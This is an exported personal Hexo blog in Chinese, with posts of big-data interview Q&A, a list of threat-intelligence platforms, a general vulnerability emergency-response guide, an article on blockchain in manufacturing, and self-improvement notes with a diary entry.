<p>229、科学研究第一范式、第二范式、第三范式、第四范式。 第一范式 (科学实验)、第二范式 (科学理论)、第三范式 (系统模拟)、第四范式 (数据密集型计算) 第一范式：经验范式，以观察和实验为依据的研究。 第二范式：以建模和归纳为基础的理论学科和分析范式，又称为理论范式。 第三范式：以模拟复杂现象为基础的计算科学范式，又称为模拟范式。</p>
<p>第四范式：以数据考察为基础，联合理论、实验和模拟一体的数据密集计算的范式，数据被捕获或者 由模拟器生成，利用软件处理，信息和知识存储在计算机中，科学家使用数据管理和统计学方法分析 数据。 </p>
<p>230分布式系统的 CAP 理论。 CAP 一致性：所有节点在同一时间具有相同的数据。 可用性：保证每个请求的成功或失败都有相应。 分区容错性：系统中任意信息的丢失或失败不影响系统的继续运行。 CAP 定理：一个分布式系统不可能同时满足一致性、可用性、和分区容错性，最多只能同时满足两 个系统需求。在考虑满足系统需求时，要根据实际需要来选择关注点，进而采用相应的策略。 CAP 选择：1. 放弃分区容错性。2. 放弃可用性。3. 放弃一致性。 </p>
<p>231、函数式语言的概念及特点 函数式语言是一种典型的程序设计语言。特点是把问题求解过程表示成块结构，对调用块的调用者来 说，每个块都有输入数据和经过加工处理后的输出数据 </p>
<p>232、Map 及 Reduce 过程的含义及功能： Map（映射）Reduce（化简）。Map 函数应用于集合中的所有成员，然后返回一个基于这个处理 的结果集。Reduce 函数是从两个或更多个 Map 结果中，通过多个线程、进程或者独立系统并执行 处理的结果集进行分类和归纳。一个 Map 函数用来把一组键值对映象成一组新的键值对，Reduce 函数用来对同一个键的值进行合并。 </p>
<p>233、什么是分布式计算 答：分布式计算是一门计算机科学，主要研究分布式系统。一个分布式系统包括若干通过网络互联的 计算机。这些计算机互相配合以完成一个共同的目标（我们将这个共同的目标称为“项目”）。具体的过程是：将需要进行大量计算的项目数据分割成小块，由多台计算机分别计算，再上传运算结果后 统一合并得出数据结论。在分布式系统上运行的计算机程序称为分布式计算程序；分布式编程就是编 写上述程序的过程。 </p>
<p>234、假如 Namenode 中没有数据会怎么样？ 没有数据的 Namenode 就不能称之为 Namenode，通常情况下，Namenode 肯定会有数据。 </p>
<p>235、在 Hadoop HDFS 中，集群中的 DataNode 节点需要周期性地向 NameNode 发送什么信息？ 答：在 Hadoop HDFS 中，DataNode 需要周期性地向集群中的 DataNode Master 节点发送心跳 信息和块报告。接收到心跳信息，说明该 DataNode 节点工作正常；块报告包含了 DataNode 节点 上所有块的列表以及块 id 与磁盘文件存储的映射关系。 </p>
<p>236、在 Hadoop HDFS 中，SecondaryNameNode 的主要作用是什么？ 答：辅助 NameNode，分担其工作量；定期合并镜像文件（fsimage）和编辑日志文件（fsedits）， 并推送给 NameNode；在紧急情况下，可辅助恢复 NameNode 节点。 </p>
<p>237、请简要说明 Hadoop YARN 的一级调度管理与二级调度管理？ 答：YARN 作为分布式集群资源管理框架，可用于集群资源的管理以及应用的调度。YARN 的一级调 度管理包括计算资源管理和 Application 生命周期的管理；二级调度管理包括 Application 内部计算 模型的管理以及多样化计算模型的管理。 </p>
<p>238、简述数据产生方式的变革 ①运营式系统阶段 建立在数据库上的大量运营系统产生的结构化信息，数据产生是被动的 ②用户原创内容阶段 大量上网用户本身就是内容的产生者，数据量急剧增加，数据产生是主动的 ③感知式系统阶段 物联网发展，物联网的设备自动产生数据，短时间内生成更密集、更大量的数据</p>
<p>239、说说大数据与云计算、物联网的关系 三者相辅相成；大数据分析的很多技术来自云计算，大数据为云计算提供用武之地 物联网产生大数据，物联网借助云计算和大数据技术实现物联网大数据的存储、分析和处理 </p>
<p>240、简述名称节点、数据节点、第二名称节点 名称节点（NameNode）负责管理分布式文件系统的命名空间，由 FSImage 和 Editlog 组成 FsImage 用于维护文件系统树和文件树中所有文件和文件夹的元数据，操作日志文件 Editlog 记录所 有针对文件的创建、删除、重命名的操作 数据节点（DataNode）负责数据的存储和读取 第二名称节点（SecondaryNameNode）可以完成 FSImage 和 Editlog 的合并操作，减小 Editlog 文件大小，缩短名称节点启动时间。同时起到了 NameNode 冷备的作用 </p>
<p>241、触发器的作用? 触发器是一种特殊的存储过程, 主要是通过时间来出发而被执行的. 它可以强化约束,来维护数据的 完整性和一致性, 可以跟踪数据库内的操作从而不允许未经许可的更新和变化. 可以级联运算 </p>
<p>242、什么是存储过程? 用什么来调用? 存储过程是一个预编译的 SQL 语句, 有点事允许模块化的设计, 只需要创建一次,就可以被多次调 用,如果需要执行多次 SQL,那么存储过程的速度更快. 可以用命令对象来调用存储过程. 可以供外部 程序调用, 如 java 程序 </p>
<p>243 存储过程的有优缺点? 优点: 存储过程是一个预编译的 SQL 语句, 执行效率高,放在数据库中,直接调用,减少网络通信,安全性 高、可重复使用 缺点: 移植性差</p>
<p>244、存储过程与函数的区别? 存储过程: 在数据库中完成指定的增删改查操作 申明: procedure 函数: 在编程语言中进行任务的处理 申明: function </p>
<p>245、索引的作用? 和他的优点缺点是什么? 索引就是一种特殊的查询表, 数据库的搜索可以利用它加速对数据的检索. 类似于现实生活中的目录. 不需要查找整本书就可以找到想要的结果. </p>
<p>246、HDFS 优点： 1、高可靠性。Hadoop 按位存储和处理数据的能力值得人们信赖。 2、高扩展性。Hadoop 是在可用的计算机集簇间分配数据并完成计算任务的，这些集簇可以方便地 扩展到数以千计的节点中。 3、高效性。Hadoop 能够在节点之间动态地移动数据，并保证各个节点的动态平衡，因此处理速度 非常快。 4、高容错性。Hadoop 能够自动保存数据的多个副本，并且能够自动将失败的任务重新分配。 5、低成本。 </p>
<p>247、OpenStack 是什么 OpenStack 是一个管理计算、存储和网络资源的数据中心云计算开放平台 </p>
<p>248、集装箱数据中心有哪些优点？</p>
<p>（1）高密度 （2）模块化（3）按需快速部署 （4）移动便携（5）Free Cooling 功能 </p>
<p>249、Google 云计算系统的管理有哪些技术？ （1）大规模集群安装技术 （2）故障检测技术 （3）节点动态加入技术 （4）节能技术 </p>
<p>250、GFS 系统构架是如何构成的，有什么特点？ （1）GFS 将整个系统的节点分为三类角色：client（客户端）、master（主服务器）和 Chunk Server （数据块服务器） （2）特点：1.采用中心服务器模式 2.不缓存数据 3.在用户态下实现 4.只提供专用接口 </p>
<p>251、.hive 内部表和外部表的区别 内部表：加载数据到 hive 所在的 hdfs 目录，删除时，元数据和数据文件都删除 外部表：不加载数据到 hive 所在的 hdfs 目录，删除时，只删除表结构。 </p>
<p>252、生产环境中为什么建议使用外部表？ 因为外部表不会加载数据到 hive，减少数据传输、数据还能共享。 hive 不会修改数据，所以无需担心数据的损坏</p>
<p>删除表时，只删除表结构、不删除数据。 </p>
<p>253、insert into 和 override write 区别？ insert into：将数据写到表中 override write：覆盖之前的内容。 </p>
<p>254、.创建 rdd 的几种方式 1.集合并行化创建(有数据) val arr = Array(1,2,3,4,5) val rdd = sc.parallelize(arr) val rdd =sc.makeRDD(arr) 2.读取外部文件系统，如 hdfs，或者读取本地文件(最常用的方式)(没数据) val rdd2 = sc.textFile(“hdfs://hdp-01:9000/words.txt”) // 读取本地文件 val rdd2 = sc.textFile(“file:///root/words.txt”) 3.从父 RDD 转换成新的子 RDD 调用 Transformation 类的方法，生成新的 RDD </p>
<p>255、HBase 宕机如何处理 答：宕机分为 HMaster 宕机和 HRegisoner 宕机，如果是 HRegisoner 宕机，HMaster 会将其所管 理的 region 重新分布到其他活动的 RegionServer 上，由于数据和日志都持久在 HDFS 中，该操作 不会导致数据丢失。所以数据的一致性和安全性是有保障的。 如果是 HMaster 宕机，HMaster 没有单点问题，HBase 中可以启动多个 HMaster，通过 Zookeeper 的 Master Election 机制保证总有一个 Master 运行。即 ZooKeeper 会保证总会有一个 HMaster 在对外提供服务。</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>威胁情报平台</title>
    <url>/2022/04/06/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E5%B9%B3%E5%8F%B0/</url>
    <content><![CDATA[<p><strong>01、国内威胁情报平台</strong></p>
<p>1、微步在线</p>
<ul>
<li></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://x.threatbook.cn/</span><br></pre></td></tr></table></figure>

<p>2、天际友盟RedQueen安全智能服务平台</p>
<ul>
<li></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://redqueen.tj-un.com/</span><br></pre></td></tr></table></figure>

<p>3、360威胁情报中心</p>
<ul>
<li></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://ti.360.net/</span><br></pre></td></tr></table></figure>

<p>4、奇安信威胁情报中心</p>
<ul>
<li></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://ti.qianxin.com/</span><br></pre></td></tr></table></figure>

<p>5、VenusEye威胁情报中心</p>
<ul>
<li></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.venuseye.com.cn/</span><br></pre></td></tr></table></figure>

<p>6、NTI 威胁情报中心</p>
<ul>
<li></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://ti.nsfocus.com/</span><br></pre></td></tr></table></figure>

<p>7、安恒威胁情报中心</p>
<ul>
<li></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://ti.dbappsecurity.com.cn/</span><br></pre></td></tr></table></figure>

<p>8、安天威胁情报中心</p>
<ul>
<li></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.antiycloud.com/</span><br></pre></td></tr></table></figure>

<p>9、深信服安全中心</p>
<ul>
<li></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://wiki.sec.sangfor.com.cn/index/abroad</span><br></pre></td></tr></table></figure>

<p><strong>02、国外威胁情报平台</strong></p>
<p>1、IBM X-Force</p>
<ul>
<li></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://exchange.xforce.ibmcloud.com/</span><br></pre></td></tr></table></figure>

<p>2、VirusTotal</p>
<ul>
<li></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.virustotal.com/gui/home/upload</span><br></pre></td></tr></table></figure>

<p>3、SANS互联网风暴中心</p>
<ul>
<li></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://isc.sans.edu/</span><br></pre></td></tr></table></figure>

<p>4、Threatcrowd 开源威胁情报</p>
<ul>
<li></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.threatcrowd.org/</span><br></pre></td></tr></table></figure>

<p>5、hreatMiner</p>
<ul>
<li></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.threatminer.org/</span><br></pre></td></tr></table></figure>

<p>6、GreyNoise</p>
<ul>
<li></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.greynoise.io/</span><br></pre></td></tr></table></figure>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>安全应急漏洞排查思路</title>
    <url>/2022/04/06/%E5%AE%89%E5%85%A8%E5%BA%94%E6%80%A5%E6%BC%8F%E6%B4%9E%E6%8E%92%E6%9F%A5%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<p><em><strong>转载于：<a href="https://mp.weixin.qq.com/s/3phojClSEsnEghJ0uVTE4Q">https://mp.weixin.qq.com/s/3phojClSEsnEghJ0uVTE4Q</a></strong></em></p>
<p><strong>对于突发0day漏洞等安全应急场景，如何快速进行排查和处置。</strong>我将分享我的思路和一些理解，欢迎补充和指正。</p>
<hr>
<p><strong>01、资产梳理</strong></p>
<p>资产是风险管理的基础，摸清家底很重要，但也很难。资产梳理的颗粒度，在面对应急事件时，就会显得多么的重要。</p>
<p>核心资产是需要重要关注的目标，而根据系统建设的方式，我们一般可以将系统分为自主研发系统和外部采购系统。</p>
<p><strong>02、漏洞排查</strong></p>
<p>自主研发系统，可在第一时间联系开发人员进行自查，常用的手工排查方式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看pom.xml的版本号、查看jar中MF文件版本号检查Jar包、检查代码引用类</span><br></pre></td></tr></table></figure>

<p>从安全层面上，为确保对所有系统完成漏洞排查，一般可采用批量扫描方式，对所有资产进行快速检测。扫描方式以版本比对、漏洞库比对、POC扫描为主，常用的检测工具有：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">商业漏洞扫描工具主机安全应急漏洞检测软件成分分析（SCA）第三方开源组件检测 (IAST)</span><br></pre></td></tr></table></figure>

<p>外部采购系统，可联系供应商进行自查，以漏洞自查报告作为反馈，如存在漏洞影响，则供应商修复产品漏洞。</p>
<p><strong>03、漏洞防护</strong></p>
<p>在防护层面上，我们可通过采取一些缓解措施，为后续资产排查和补丁修复工作争取到充足的时间。</p>
<p>在网络链路上，采用防火墙、IPS、WAF、NDR等产品，对威胁特征字符串添加防护规则，对漏洞攻击进行拦截阻断。</p>
<p>基于网关拦截恶意请求、全局过滤器等方式，可快速调整防护策略，则提供了一种新的解决方向。</p>
<p><strong>04、漏洞修复</strong></p>
<p>一般而言，我们采取的策略是“排查+防护“两手抓，为高危漏洞修复争取时间。按照官方漏洞公告指引，推进补丁修复，才是解决系统漏洞问题最有效的方式。</p>
<p>每年真正比较有影响力的漏洞编号，其实并不多。作为一个安全工程师，首先我们要保持一定的风险敏感度，一定要重视起来。当你足够重视的时候，你才能慢慢引导你身边的人，你所在的团队跟着你一起重视。原本以为很难的事情,做了之后才知道原来很简单。</p>
<p>–来自某次应急漏洞处置后的心得体会。</p>
<p><strong>思维导图如下所示：</strong></p>
<p><img src="/.io//blog\source_posts\安全应急漏洞排查思路\01.png" alt="img"></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>应急排查</tag>
      </tags>
  </entry>
  <entry>
    <title>区块链与制造业的结合</title>
    <url>/2022/04/06/%E5%8C%BA%E5%9D%97%E9%93%BE%E4%B8%8E%E5%88%B6%E9%80%A0%E4%B8%9A%E7%9A%84%E7%BB%93%E5%90%88/</url>
    <content><![CDATA[<p><em><strong>转载：<a href="https://mp.weixin.qq.com/s/8AkdlY3k9tZH_h7howR7oA">https://mp.weixin.qq.com/s/8AkdlY3k9tZH_h7howR7oA</a></strong></em></p>
<p>人们正在积极探索区块链在各个行业的应用。除了金融之外，区块链在汽车行业、农业以及制造业等也都有应用。此前01区块链写了一篇《四大汽车制造商如何应用区块链》。今天就让我们来理解区块链如何帮助制造业，让制造业更上一层楼。</p>
<h2 id="区块链如何帮助制造业"><a href="#区块链如何帮助制造业" class="headerlink" title="区块链如何帮助制造业"></a>区块链如何帮助制造业</h2><p>如何辨识防伪是如今许多制造业都需要面对的一个棘手问题。然而许多防伪系统都是中心化的，真真假假由这个中心化系统/组织说得算，人们对其的信任度只能日积月累的慢慢累积起来。此外，数据不统一、可不可靠也是一个问题。</p>
<p>区块链系统则是能够很好的解决以上问题。此前沃尔玛将区块链技术应用在供应链溯源系统上，因区块链的特性，人们不必担心数据的真实性和被篡改。区块链技术使得需要共享的数据，在交易各方之间公开透明，便于及时发现解决问题，提供完整且流畅的信息流，提升供应链整体效率。通过区块链系统，我们能够剔除掉供应链里假冒伪劣的问题，进一步让顾客确保产品的质量。</p>
<p>在传统的网络当中，尤其是制造系统里，所有的设备之间的通信都是中心化的。这就促使了该网络具有高成本、低可扩展性、低可维护性和差稳定性的缺陷。区块链的点对点（P2P，Point to Point）特性，让我们能够建设一个去中心化的网络。我们可以将计算和存储需求分散到组成物联网网络的各个设备中，有效阻止网络中的任何单一节点的失败，而导致整个网络崩溃的情况发生。在处理异常时，其维护、维修成本也能够降低。例如当设备有问题时，整体网络仍能够运行，不必关闭整个网络来进行维护。区块链的防篡改特性能够有效防止工业物联网中任何单节点设备被恶意攻击和控制后带来的信息泄露和恶意操控风险。区块链系统也能够让人们都及时清楚知道所有设备的情况。</p>
<p>智能制造重点在于提高生产的效率、减少人力以及减少废料。这就需要对整个生产过程实现数据采集、过程监控、设备管理、质量管理、生产调度以及数据统计分析，通过实时监测情况来达到目的。区块链技术的分布式对等、透明可信、高可靠性等特性，可以为智能化生产中安全生产、数据存储、产品生命周期管理、产能共享等方面提供服务，加速智能化生产的发展。例如通过区块链技术，可以将制造企业中的传感器、控制模块和系统、通信网络、企业资源计划系统（ERP）、生产管理系统有制造执行系统（MES），产品生命周期管理软件（PLM）等系统连接起来，可以确保记录的真实性与一致性，实现长期有效的持续性监督。在数据存储方面，区块链技术可以将设备操作、生产、维护等记录相连接，实现实时动态掌握相关数据。</p>
<p>此外，区块链系统可以帮助企业提高财务状况。例如实现资金流、信息流和物流的协调，通过合理的库存平衡，达到采购、入库与支付的流程自动化，实现销售、出库与收入实现流程的一体化，降低企业的运营成本。管理者可以通过上述数据来进行分析，进而知道货物的质量状况，调整运送时间，减少库存废料，为供应链运营带来巨大的利润。</p>
<p>帮助工厂搭建自身区块链系统的NULS</p>
<p>NULS是一个企业级的区块链解决方案平台。NULS于2018年7月上线。NULS致力于构建一个多链并行、价值互通的区块链生态网络，给开发者提供开发解决方案，比如提供微服务、智能合约、快速造链、跨链互操性、资产发行等服务，并可定制化。NULS为用户提供各种定制模块，极大提高了开发者开发效率并节约成本以及时间。</p>
<p>如今，NULS主要有两个核心产品NULS ChainBox以及链工厂。</p>
<p>NULS ChainBox基于微服务架构，该服务封装了账本，账户，交易，区块，共识，网络六个底层模块。模块的优势在于提高了开发者开发区块链程序的可靠性。因为编程里有许多语言，所使用的逻辑并不一样，这就会导致开发者的程序往往会有一些漏洞或是Bug（报错），给了黑客有机可乘。而通过模块，开发者只需要基于这些模块搭建起自己需要的模型/“城堡”就可以了。在保证效率的同时也保证了严谨性以及安全性，这也是利用模块建立区块链程序的好处。倘若工厂有需要，工厂也可以基于上述的模块来搭建起自己需要的网络或是服务。</p>
<p>工厂也可以在链工厂利用图形化界面来进行搭建程序。这大大提高了工厂搭建区块链程序的效率并降低了门槛。链工厂中存在一个模块库供使用，每一个块都可以理解为标准化的块，同种类之间可进行替换且支持多语言、可扩展性强。</p>
<p>例如A公司基于链工厂开发了一套区块链系统，而B公司看到了觉得不错，想要开发一套基于A公司的系统，那么直接在链工厂上面完成即可。根据NULS的说法，B按照A公司的标准使用链工厂基于链工厂丰富的行业模块，直接拼建一个即可，搭建的同时某些块进行特殊化替换即可。而在这个过程中，B的建链成本以及周期也将远远低于A。</p>
<p>从企业的角度来说，区块链是个全新的行业，且区块链系统的搭建是一项昂贵又费时的工程。那么，降低区块链搭建门槛、节省区块链搭建成本以及周期，将有利于区块链技术在商业上的大规模应用，链工厂未来也将使得很多企业能够无须请外包团队进行搭建就可拥有一个符合企业自身需求的区块链网络。</p>
<p>国内也有企业负责帮助企业搭建区块链系统。天心天思是国内一家提供智能制造解决方案的公司。天心天思也采用区块链技术来构建企业智能制造体系，全面提升企业精益生产水平。天心天思帮助企业记录各种生产相关的事件，包括产品设计的发布，产品参数的定义等等数据。在天心天思上搭建的区块链系统能存储 CAD图纸，文档和其他数字资产，追踪复杂的供应链。借助大数据分析，评估其实际价值，并对后期制造进行预期分析，帮助企业快速有效地建立更为安全的运营机制、更为高效的工作流程和更为优秀的服务。</p>
<p>根据天心天思的介绍，区块链系统有助于提高价值链的透明度、灵活性，并能够更敏捷地应对生产、物流、仓储、营销、销售、售后等环节存在的问题。</p>
<p><em><strong>详情见天心天思官网</strong></em></p>
<h2 id="区块链确保员工福利"><a href="#区块链确保员工福利" class="headerlink" title="区块链确保员工福利"></a>区块链确保员工福利</h2><p>哈佛大学陈曾熙公共卫生学院、ConsenSys （一个提供区块链解决方案的公司）和 Levi Strauss 基金会（李维·施特劳斯基金会）合作开发了一种新的工厂工人福利的平台（Shining a Light on Worker Well-being）。</p>
<p>通过一个问卷调查，我们可以将员工相关福利的数据集成到远程部署的区块链平台中。在这里，员工可以安全地分享他们的工作经验以及福利。区块链让他们上传的数据无法被篡改。该系统使用这种受保护的聚合数据来创建调查结果的可视化展示，几乎实时地反映整个工厂员工的意见。</p>
<p>该系统帮助工厂管理层更好地确定可以改善工人体验的方面，而这些干预措施和管理层的后续行动有可能减少人员流动和缺勤，同时改善可持续和生产性的做法。</p>
<p>在冠状病毒大流行的时代，企业或是工厂需要更加关注员工的健康和福祉。因此该平台对于企业、工厂来说是一个非常有效且有用的手段。当然，发布者在白皮书上也说明了此平台仍然有许多困难需要去克服。</p>
<p>但此平台的优势在于帮助企业在全球大流行病的时代下，提供了一个保障、保护工人的福利以及生活的手段。员工对于厂商来说是重要的组成部分，员工染病了或是福利得不到保障而罢工的话，对于企业的供应链、运转来说都是致命的。而上述平台则是帮助企业确保运营健康的一个工具。</p>
<p><img src="/.io//blog\source_posts\区块链与制造业的结合\01.png" alt="图片"></p>
<p><em>Shining a Light on Worker Well-being平台白皮书</em></p>
<h2 id="区块链与供应链的结合"><a href="#区块链与供应链的结合" class="headerlink" title="区块链与供应链的结合"></a>区块链与供应链的结合</h2><p>有些公司也搭建了区块链系统来提高与客户之间的信任度和信息交换。例如知名电动车公司特斯拉就在上海超级工厂应用了区块链技术来优化物流和溯源系统，为用户提供包括载货门、预约日期、终端放行等在内的一系列信息服务。国内另一知名酒公司茅台利用区块链技术进行产品溯源的同时，还对流转和物流系统进行了完善，做到了商品从生产流程到出库再到配送，全流程信息透明且可以查询。</p>
<p>2020年12月，国家电网开展了“区块链﹢智慧能源”的计划，利用区块链技术，通过将新能源发电计划数据、用电计划数据、实际用电数据等重要数据上链存证，进行校验确保新能源出力曲线交易业务数据的真实、可信，保障新能源消纳交易的真实发生。</p>
<p>除了电力上的应用，目前已经有企业将区块链应用于工业废弃物的管理。中间的过程包括危险垃圾生成、堆放、运输都记录上区块链系统。如果此技术得到推广，相信环保活动也会变得更加绿色。</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>五年</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>成长记录</title>
    <url>/2022/04/05/%E6%88%90%E9%95%BF%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="每日必看"><a href="#每日必看" class="headerlink" title="每日必看"></a>每日必看</h1><p><strong>1.早上三问</strong></p>
<p>今天的目标</p>
<p>今天怎么才能比昨天好</p>
<p>今天要提升哪些方面的技能</p>
<p><strong>2.平时六勤</strong></p>
<p>勤观察、勤倾听、拜访客户、勤打电话，勤沟通、勤发消息，勤发圈</p>
<p><strong>3.晚上三思</strong></p>
<p>今天学到了什么</p>
<p>今天是否完成目标</p>
<p>今天我是否全力以赴做事</p>
<h1 id="知识积累"><a href="#知识积累" class="headerlink" title="知识积累"></a>知识积累</h1><h2 id="管理"><a href="#管理" class="headerlink" title="管理"></a>管理</h2><h3 id="底层逻辑"><a href="#底层逻辑" class="headerlink" title="底层逻辑"></a>底层逻辑</h3><p>底层逻辑：就是决定事物运行的最基本也是最核心的规律</p>
<p>商业的底层逻辑是流量、产品、营销</p>
<h3 id="阅读循环"><a href="#阅读循环" class="headerlink" title="阅读循环"></a><strong>阅读循环</strong></h3><p>阅读 —&gt; 总结 —&gt; 分享 —&gt; 使用</p>
<p>1.需要只是跨学科的串联能力</p>
<p>2.在生活和工作中使用</p>
<p>3.思维模型</p>
<p>4.持续迭代</p>
<p>最后：打造出先进的个人商业模式。</p>
<h3 id="个人学习曲线-–-金融"><a href="#个人学习曲线-–-金融" class="headerlink" title="个人学习曲线 – 金融"></a>个人学习曲线 – 金融</h3><p>1.看研究报告，券商的、四大的、投行的</p>
<p>公众号、首席的个人号、慧博、萝卜投研、发现报告（除了前两个，都是第三方平台）</p>
<p><em>注</em>：研究报告内容都是有理有据有逻辑地，对行业和宏观地研究有助于理解发展方向*</p>
<p>2.见缝插针地阅读，多关注政策、上层</p>
<p>3.纪录片</p>
<h3 id="认知"><a href="#认知" class="headerlink" title="认知"></a>认知</h3><p>1.SWOT分析法</p>
<p>strengths — 优势</p>
<p>weaknesses — 劣势</p>
<p>opportunities — 机会</p>
<p>threats — 威胁</p>
<p>分析自身优劣势，提高机会，防范风险</p>
<p>2.本质溯源法</p>
<p>why：为什么发生</p>
<p>why：为什么没有发现</p>
<p>why：为什么没有预判</p>
<p>寻求发生的原因找到解决方案</p>
<p>3.六顶帽思维</p>
<p>理顺思路，全面思考的认知工具</p>
<p>白帽信息、红帽情绪、黑帽风险、黄帽利益、绿帽变、蓝帽控制</p>
<p>可以应用在分析，判断，统筹</p>
<p>4.三层解释思维模型</p>
<p>现象层：存在事物的表面现象</p>
<p>本质层：追溯本质洞悉法则</p>
<p>技术层：解释现象背后的规律</p>
<p>深度剖析一个事件的原因和规律</p>
<p>5.五遍传递法</p>
<p>交代清楚事项            要求对方复述            探讨此事目的            做应急预案        请对方提出见解        应用在沟通交流、传递信息、达成共识</p>
<p>6.POCA循环</p>
<p>plan计划        do执行        check检查        act处理        用于事物迭代升级管理</p>
<p>7.效果分析法</p>
<p>效率：以正确的方法做事</p>
<p>整理 — 整理和分类任务</p>
<p>执行 — 立即执行</p>
<p>收 — 把任务清理出来</p>
<p>组织 — 下一步行动</p>
<p>顾 — 查漏补缺</p>
<p>8.心流思维</p>
<p>1.明确目标，拆分小目标；                    2.适当难度，难易适中；</p>
<p>3.及时反馈，建立奖励反馈机制；        4.超于平常的专注力；</p>
<p>5.全省关注，30分钟以上专注时间；</p>
<p>9.七间分析法</p>
<p>what：目的是什么</p>
<p>why：为什么要做</p>
<p>who：谁来做</p>
<p>when：何时做</p>
<p>where：在哪里做</p>
<p>how：方法是什么</p>
<p>how much：做到何种程度</p>
<h3 id="带团队"><a href="#带团队" class="headerlink" title="带团队"></a>带团队</h3><p><strong>1.对待基层管理</strong></p>
<p>三多：多支持、多鼓励、多赞美</p>
<p>三少：少批评、少指责、少埋怨</p>
<p><strong>2.对待中层管理</strong></p>
<p>三多：多要求、多培训、多辅导</p>
<p>三少：少放任、少借口、少理由</p>
<p><strong>3.对待高层管理</strong></p>
<p>三多：多沟通、多回顾、多展望</p>
<p>三少：少口号、少画饼、少空话</p>
<h2 id="金融"><a href="#金融" class="headerlink" title="金融"></a>金融</h2><p><strong>description:学宏观经济学</strong></p>
<p>《宏观经济学》教科书</p>
<p>《黑天鹅》</p>
<p>《穷查理宝典》</p>
<p>《思考，快与慢》</p>
<p>《非对称风险》</p>
<p>《反脆弱》</p>
<p>《文明、现代化、价值投资与中国》</p>
<p>《经济学的思维方式》</p>
<p>《一本书读懂财报》– 肖星</p>
<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><h3 id="2022-4-12"><a href="#2022-4-12" class="headerlink" title="2022.4.12"></a>2022.4.12</h3><p>今天去实习公司办了离职手续，我昨天才入的职。虽然很难过，但是还是觉得要做个反思。提前过来实习这个事情，确实是我没考虑周全，现在又要回重庆了，瞎折腾，而且还要给房子转租，公司那边也不好意思。过来机票就是1k，再加上寄快递什么得，在这边住今天什么得，一共1.5k，转租不成功，可能押金1700直接没有了。还借了朋友的钱。</p>
<p>我一直都知道自己很犹豫，做事情总迈不出第一步，但是有时候，我迈出了第一步，每次做事，开头总是很难，而且总要踩坑，所以我把握不好到底开不开始这个度。总是把决定做在错误的事情上，是我考虑得不够周全，不够久。</p>
<p>但是来了趟杭州，还是有收获的，熟悉了公司附近的地形，踩了租房的坑，后续第二次肯定会简单很多，回去也好，把学校的毕业证书拿到了，就不用担心再被叫回去。而且如果我没有过来折腾一下，可能公司后边是直接不要我了，现在给的说法是，六月底来入职，但总还是要面试其他公司，免得到时候没工作。</p>
